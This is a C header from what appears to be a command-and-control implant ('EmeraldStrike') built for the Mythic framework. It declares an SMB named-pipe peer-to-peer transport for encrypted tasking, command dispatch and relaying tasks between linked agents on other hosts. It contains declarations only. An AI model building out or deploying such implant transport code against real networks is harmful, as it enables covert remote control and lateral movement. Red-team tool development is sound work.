#ifndef EMERALDSTRIKE_TRANSPORT_SMB_H
#define EMERALDSTRIKE_TRANSPORT_SMB_H

#include "common.h"

// ─── SMB P2P transport (agent = named pipe SERVER, Mythic/linker = CLIENT) ───

// Create the local named pipe \\.\<pipename> (duplex, message mode).
BOOL smb_start_server(PINSTANCE inst);

// Blocking serve loop: ConnectNamedPipe -> read length-prefixed message ->
// decrypt -> shared tasking dispatch -> encrypt -> write -> flush -> disconnect.
// Runs until inst->Running goes FALSE.
VOID smb_server_loop(PINSTANCE inst);

// Shared tasking processor (implemented in main.cc, same code path the HTTP
// loop uses): takes a DECRYPTED get_tasking TLV message, dispatches the
// command and returns a plaintext post_response TLV message (caller encrypts).
VOID es_smb_process_tasking(PINSTANCE inst, const BYTE* msg, DWORD msg_len,
                            BYTE** out_resp, DWORD* out_resp_len);

// ─── link client side (cmd_link) ───

// Connect as a CLIENT to \\host\pipe\<pipename>.
BOOL smb_link_connect(PINSTANCE inst, const char* host, const char* pipename, HANDLE* out_pipe);

// Run the encrypted link handshake over an established client pipe:
// plaintext (UUID + "link" + our AES key) -> peer replies encrypted under our
// key with (peer UUID + status). Fills peer_uuid on success.
BOOL smb_link_handshake(PINSTANCE inst, HANDLE pipe, char* peer_uuid, DWORD peer_uuid_size);
DWORD smb_last_hs_stage(VOID);

// Frame I/O (non-static: parent uses these to relay delegate tasks to linked peers)
BOOL smb_send_frame(PINSTANCE inst, HANDLE h, const BYTE* payload, DWORD payload_len);
BOOL smb_recv_frame(PINSTANCE inst, HANDLE h, BYTE** out, DWORD* out_len);

#endif
